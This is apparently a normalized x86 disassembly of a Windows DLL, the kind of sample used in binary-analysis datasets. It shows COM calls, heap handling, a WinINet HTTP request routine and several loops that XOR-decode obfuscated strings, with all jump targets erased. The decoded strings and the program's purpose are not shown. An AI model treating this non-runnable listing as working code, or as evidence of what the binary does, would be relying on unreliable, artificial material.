cmp [ ebp - 0x1c ] 0x0
jne r-xdata
or [ esi ] 0x1
push 0xffffffff
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_100417c0
or [ esi ] 0x2
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi + 0x4 ] eax
call sub_10041a20
mov eax edi
call sub_1004fa89
retn 0x24
sub_10059890
push ebp
mov ebp esp
push 0xffffffff
push sub_10082d28
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov edi ecx
mov ecx [ eax ]
xor eax eax
mov [ ebp - 0x2c ] ax
mov eax ecx
mov esi edx
lea edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x68 ] edx
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax [ ebp - 0x68 ]
sar eax 0x1
push eax
push ecx
lea ecx [ ebp - 0x2c ]
call sub_100531b0
lea eax [ ebp - 0x2c ]
mov edx esi
push eax
lea esi [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x0
call sub_10016380
push eax
mov edx ebx
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_10030dc0
add esp 0x8
push 0xffffffff
xor ebx ebx
push ebx
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call sub_10043930
mov esi 0x8
cmp [ ebp - 0x34 ] esi
jb r-xdata
xor edx edx
mov edi 0x7
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] dx
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_1006591f
add esp 0x4
xor ecx ecx
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] cx
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x2c ]
push edx
call sub_1006591f
add esp 0x4
sub_100599a6
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000b29e
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_10059a50
push ebp
mov ebp esp
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x6c ] edi
call sub_10026670
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x5c ]
push edx
mov [ ebp - 0x5c ] ebx
mov ecx [ eax ]
push esi
push eax
mov eax [ ecx + 0xdc ]
call eax
push esi
mov edi eax
call [ LocalFree@IAT ]
cmp edi ebx
jge r-xdata
or eax 0xffffffff
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x5c ]
lea edx [ ebp - 0x68 ]
mov [ ebp - 0x68 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x68 ]
cmp eax ebx
jne r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
xor esi esi
cmp eax esi
jle r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x11c
call sub_100050e0
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x5c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x5c ]
lea edx [ ebp - 0x60 ]
push edx
mov [ ebp - 0x60 ] esi
mov ecx [ eax ]
push ebx
push eax
mov eax [ ecx + 0x1c ]
call eax
mov ecx [ ebp - 0x60 ]
cmp ecx esi
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x3b
lea edx [ ebp - 0x64 ]
push edx
mov [ ebp - 0x64 ] esi
call sub_10036d40
test eax eax
je r-xdata
inc ebx
cmp ebx [ ebp - 0x68 ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov esi [ ebp - 0x64 ]
mov edi [ ebp - 0x6c ]
push esi
add edi 0x130
call sub_1005e3c0
test esi esi
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp ecx esi
je r-xdata
mov eax [ ebp - 0x60 ]
xor esi esi
cmp eax esi
je r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0xc1
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
call sub_100050e0
sub_10059bc0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
sub eax 0x0
push edi
je r-xdata
mov ecx [ esi + 0x18 ]
mov edi [ ebp + 0x8 ]
push ecx
push edi
call sub_10035fe0
mov edx [ esi + 0x1c ]
push edx
push edi
call sub_10035fe0
mov eax [ esi + 0x20 ]
push eax
push edi
call sub_10035fe0
add esp 0x18
dec eax
je r-xdata
xor edi edi
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ esi + 0x20 ] edi
jbe r-xdata
sub eax 0x2
jne r-xdata
mov eax [ esi + 0x1c ]
push eax
push ebx
call sub_10035fe0
add esp 0x8
pop ebx
pop edi
pop esi
pop ebp
retn
mov edi edi
pop edi
mov eax [ esi + 0x18 ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_10035fe0
add esp 0x8
pop edi
pop esi
pop ebp
retn
inc edi
cmp edi [ esi + 0x20 ]
jb r-xdata
push eax
push ebx
call sub_100019c0
add esp 0x8
mov edx [ esi + 0x1c ]
mov eax [ edx + edi * 4 ]
test eax eax
je r-xdata
sub_10059c54
push 0x8
mov eax sub_1007ff7d
call sub_1002152b
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_1000a66f
lea ebx [ esi + 0x2c ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
call sub_100680bc
mov edi eax
xor eax eax
push ebx
push eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
push [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
call sub_10027fa7
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x10 ]
mov eax [ edi + 0xc ]
jmp r-xdata
push ebx
push 0x0
push eax
call sub_10027fa7
mov [ esi + 0x14 ] eax
add esp 0xc
cmp [ edi + 0x2f ] 0x4
mov eax r--data
ja r-xdata
mov eax [ edi + 0x20 ]
push ebx
push 0x0
push eax
call sub_10027fa7
mov [ esi + 0x10 ] eax
add esp 0xc
cmp [ edi + 0x2e ] 0x4
mov eax r--data
ja r-xdata
push ebx
push 0x0
push eax
call sub_10027fa7
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x14 ]
mov al [ eax ]
mov [ esi + 0xc ] al
mov eax [ edi + 0x18 ]
mov al [ eax ]
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0xd ] al
je r-xdata
mov eax [ edi + 0x24 ]
mov al [ edi + 0x29 ]
mov al [ edi + 0x28 ]
jmp r-xdata
and [ esi + 0x1c ] 0x0
cmp eax 0x7f
jl r-xdata
movsx eax al
mov [ esi + 0x1c ] eax
test eax eax
js r-xdata
call sub_1004db01
retn 0x8
push 0x4
mov esi r--data
push esi
push ebx
call sub_100796a0
push 0x4
push esi
push [ ebp - 0x14 ]
call sub_100796a0
add esp 0x18
movsx eax [ edi + 0x2e ]
push eax
movsx eax [ edi + 0x2a ]
push eax
movsx eax [ edi + 0x2b ]
push eax
lea ebx [ esi + 0x20 ]
push ebx
mov ecx esi
call sub_10047009
movsx ecx [ edi + 0x2f ]
push ecx
movsx ecx [ edi + 0x2c ]
push ecx
movsx ecx [ edi + 0x2d ]
lea eax [ esi + 0x24 ]
push ecx
push eax
mov ecx esi
mov [ ebp - 0x14 ] eax
call sub_10047009
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_10059da0
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
mov edi [ LocalFree@IAT ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call edi
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10059df0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi ecx
mov ecx [ r--data ]
mov [ ebp - 0x24 ] 0x0
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffb5
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x6 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x20 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
push esi
lea edx [ ebp - 0x28 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0x28 ]
mov eax edx
lea esi [ eax + 0x2 ]
jmp r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
lea esi [ edi + 0x24 ]
push edx
mov ecx esi
call sub_100531b0
mov ecx [ ebp - 0x28 ]
push ecx
call [ SysFreeString@IAT ]
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ esi + 0x10 ]
push r--data
xor edi edi
mov ecx esi
mov [ ebp - 0x24 ] 0x0
call sub_10039b60
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
and eax 0xfffffffe
pop esi
xor ecx ebp
add eax 0x2
pop edi
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10059ef0
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x10
push edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edi ecx
sub edi eax
xor edi edi
jmp r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1002b580
cmp [ esi + 0x14 ] 0x10
jb r-xdata
sub eax ecx
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
add esi edi
pop edi
mov [ eax ] esi
pop esi
pop ebp
retn 0xc
mov esi [ esi ]
sub_10059f39
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10050d3e
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_10059ff0
cmp [ esi + 0x68 ] 0x8
jb r-xdata
push ebx
push edi
xor edi edi
mov ebx 0x7
xor ecx ecx
mov [ esi + 0x68 ] ebx
mov [ esi + 0x64 ] edi
mov [ esi + 0x54 ] cx
cmp [ esi + 0x4c ] 0x8
jb r-xdata
mov eax [ esi + 0x54 ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov [ esi + 0x4c ] ebx
mov [ esi + 0x48 ] edi
mov [ esi + 0x38 ] ax
cmp [ esi + 0x30 ] 0x8
jb r-xdata
mov edx [ esi + 0x38 ]
push edx
call sub_1006591f
add esp 0x4
xor edx edx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x2c ] edi
mov [ esi + 0x1c ] dx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ esi + 0x1c ]
push ecx
call sub_1006591f
add esp 0x4
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] ebx
xor ecx ecx
pop edi
mov [ esi ] cx
pop ebx
retn
mov eax [ esi ]
push eax
call sub_1006591f
add esp 0x4
sub_1005a080
push ebp
mov ebp esp
push 0xffffffff
push sub_10083748
mov eax [ fs : 0x0 ]
push eax
sub esp 0x46c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi edx
mov [ ebp - 0x470 ] eax
mov eax [ esi + 0x10 ]
lea edx [ eax + eax ]
push edx
push 0x8
mov [ ebp - 0x474 ] ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
cmp [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x10 ]
jb r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x90 ]
call sub_100531b0
mov [ ebp - 0x74 ] edi
mov [ ebp - 0x70 ] esi
lea ecx [ ebp - 0x90 ]
mov edi ebx
mov [ ebp - 0x4 ] 0x0
call sub_10043a70
lea esi [ ebp - 0x46c ]
call sub_10005130
push ebx
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_1004c9d0
test eax eax
je r-xdata
add ecx ecx
push ecx
push eax
push edi
call sub_100796a0
mov esi [ esi + 0x10 ]
add esp 0xc
lea edx [ ebp - 0x28 ]
mov eax 0xb6
add esi esi
call sub_10013830
xor edx edx
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x90 ] dx
mov [ ebp - 0x7c ] 0x7
mov [ ebp - 0x80 ] 0x0
lea edx [ eax + 0x2 ]
lea ecx [ ecx ]
mov eax [ ebp - 0x468 ]
mov ecx [ ebp - 0x470 ]
mov edx [ ebp - 0x464 ]
mov edi [ ebp - 0x474 ]
mov [ ecx ] eax
mov [ edi ] edx
call sub_1003c110
test eax eax
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax 0xb1
call sub_10013830
mov ecx esi
push ecx
mov [ ebp - 0x4 ] 0x0
call sub_100024e0
cmp [ ebp - 0x7c ] 0x8
jb r-xdata
lea edx [ ebp - 0x46c ]
push edx
mov [ ebp - 0x4 ] 0x0
call sub_100024e0
cmp [ ebp - 0x7c ] 0x8
jb r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0xe9
call sub_10013830
lea eax [ ebp - 0x46c ]
push eax
mov [ ebp - 0x4 ] 0x0
call sub_100024e0
cmp [ ebp - 0x7c ] 0x8
jb r-xdata
mov eax 0x2
jmp r-xdata
mov edx [ ebp - 0x90 ]
push edx
call sub_1006591f
add esp 0x4
xor eax eax
mov eax [ ebp - 0x90 ]
push eax
call sub_1006591f
add esp 0x4
mov eax 0x3
jmp r-xdata
mov ecx [ ebp - 0x90 ]
push ecx
call sub_1006591f
add esp 0x4
sub_1005a280
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f07b
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx [ ebp + 0x8 ]
xor eax eax
cmp edx 0x5
ja r-xdata
mov edx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x20 ]
or edx 0x400000
push edx
mov edx [ ebp + 0x18 ]
push edx
mov edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0x1c ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax [ ecx ]
push eax
call [ HttpOpenRequestW@IAT ]
xor ecx ecx
mov esi eax
test esi esi
setne cl
push ecx
call sub_10051250
add esp 0x4
test esi esi
je r-xdata
jmp [ edx * 4 + jump_table_1005a344 ]
xor eax eax
push 0x8
call sub_10055606
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov eax r--data
jmp r-xdata
mov eax r--data
jmp r-xdata
mov eax r--data
jmp r-xdata
mov eax r--data
push esi
mov ecx eax
call sub_10028100
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x1c
sub_1005a360
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0xc ]
mov ecx esi
sub ecx eax
push ecx
push eax
push edx
call sub_100796a0
add esp 0xc
mov eax esi
pop esi
pop ebp
retn 0x10
sub_1005a390
push ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x2e
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x10
jb r-xdata
push 0x1
xor eax eax
lea edx [ esi + 0x13c ]
push esi
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x8 ] ax
call sub_1000a300
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x80 ]
mov eax 0x81
call sub_100050e0
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1005a415
push 0x28
mov eax sub_1007f332
call sub_100097c8
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x18
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
push ecx
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_1005ae38
jmp r-xdata
lea ecx [ eax + 0x1c ]
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
sub_1005a4a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080f28
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea eax [ ebp - 0x10 ]
push eax
call sub_100688a0
push eax
mov [ ebp - 0x4 ] 0x0
call sub_1001b110
mov [ ebp - 0x4 ] 0xffffffff
mov edi [ ebp - 0x10 ]
add esp 0x4
mov ebx eax
test edi edi
je r-xdata
mov edx [ ebx ]
mov eax [ edx + 0x18 ]
push 0x20
mov ecx ebx
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x14 ]
not esi
call sub_10050f50
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
sub_1005a563
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp ecx [ eax + 0x4 ]
jne r-xdata
xor eax eax
mov eax [ eax ]
cmp eax [ ebp + 0xc ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x8
sub_1005a590
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
push ebx
push esi
push edi
lea edi [ ebp - 0x50 ]
push edi
xor ebx ebx
mov esi edx
mov [ ebp - 0x50 ] ebx
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0xdc ]
mov [ ebp - 0x60 ] ebx
call eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x50 ]
lea edx [ ebp - 0x5c ]
mov [ ebp - 0x5c ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x5c ]
cmp eax ebx
jne r-xdata
pop edi
pop esi
lea eax [ ebx + 0x1 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
xor edi edi
cmp eax ebx
jle r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0xd7
call sub_100050e0
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x50 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x60 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x50 ]
lea edx [ ebp - 0x54 ]
push edx
mov [ ebp - 0x54 ] ebx
mov ecx [ eax ]
push edi
push eax
mov eax [ ecx + 0x1c ]
call eax
mov eax [ ebp - 0x54 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0xef
call sub_100050e0
lea edx [ ebp - 0x58 ]
mov [ ebp - 0x58 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
test eax eax
je r-xdata
inc edi
cmp edi [ ebp - 0x5c ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x58 ]
push ecx
call sub_100428d0
mov edx [ ebp - 0x58 ]
push edx
call [ SysFreeString@IAT ]
jmp r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0xf1
call sub_100050e0
mov [ ebp - 0x60 ] 0x3
jmp r-xdata
mov eax [ ebp - 0x54 ]
cmp eax ebx
je r-xdata
sub_1005a6c0
push ebp
mov ebp esp
push 0xffffffff
push sub_10082bf6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x248
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ r--data ]
mov edi ecx
movsx ecx [ eax ]
xor ecx 0xff9d
and ecx 0xff
lea eax [ ebp - 0x254 ]
push eax
xor edx edx
mov [ ebp - 0x254 ] cx
mov ecx eax
push ecx
mov [ ebp - 0x252 ] dx
mov edx eax
mov eax [ rw-data ]
push edx
push 0x0
push 0x1
push eax
lea eax [ ebp - 0x218 ]
call sub_1002ed80
test eax eax
je r-xdata
xor ecx ecx
push 0x4
mov [ ebp - 0x234 ] cx
push r--data
lea ecx [ ebp - 0x234 ]
mov [ ebp - 0x220 ] 0x7
mov [ ebp - 0x224 ] 0x0
call sub_100531b0
lea edx [ ebp - 0x234 ]
push edx
lea edx [ ebp - 0x218 ]
lea esi [ ebp - 0x250 ]
mov [ ebp - 0x4 ] 0x0
call sub_10016380
add esp 0x4
push eax
lea ecx [ edi + 0x70 ]
mov [ ebp - 0x4 ] 0x1
call sub_10036380
mov esi 0x8
cmp [ ebp - 0x23c ] esi
jb r-xdata
mov eax 0x1
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x23c ] 0x7
mov [ ebp - 0x240 ] 0x0
mov [ ebp - 0x250 ] cx
cmp [ ebp - 0x220 ] esi
jb r-xdata
mov eax [ ebp - 0x250 ]
push eax
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
xor eax eax
mov edx [ ebp - 0x234 ]
push edx
call sub_1006591f
add esp 0x4
sub_1005a810
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
push edi
cmp [ ebx + 0x4 ] esi
jbe r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edi [ eax + esi * 4 ]
mov ecx [ ebp + 0xc ]
mov edx [ edi + 0x4 ]
push ecx
push edx
call sub_100239df
add esp 0x8
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
cmp esi [ ebx + 0x4 ]
jb r-xdata
sub_1005a850
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0x10 ]
push edi
push eax
push ecx
call sub_1002ec01
mov esi eax
add esp 0xc
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x10
call sub_1004fd6f
mov edx [ eax ]
mov eax [ ebp + 0x14 ]
mov [ eax ] edx
mov eax esi
sub_1005a883
mov edi edi
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0xa0 ] eax
call sub_10039c8c
lea ecx [ eax + 0xc4 ]
mov [ ebp - 0xac ] ecx
lea ecx [ eax + 0xc8 ]
lea ebx [ eax + 0xbc ]
add eax 0x14b
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x98 ] eax
test esi esi
je r-xdata
xor eax eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi ] 0x43
jne r-xdata
push esi
call sub_10079b60
mov edi 0x83
pop ecx
mov [ ebp - 0xb0 ] eax
cmp eax edi
jae r-xdata
cmp [ esi + 0x1 ] 0x0
jne r-xdata
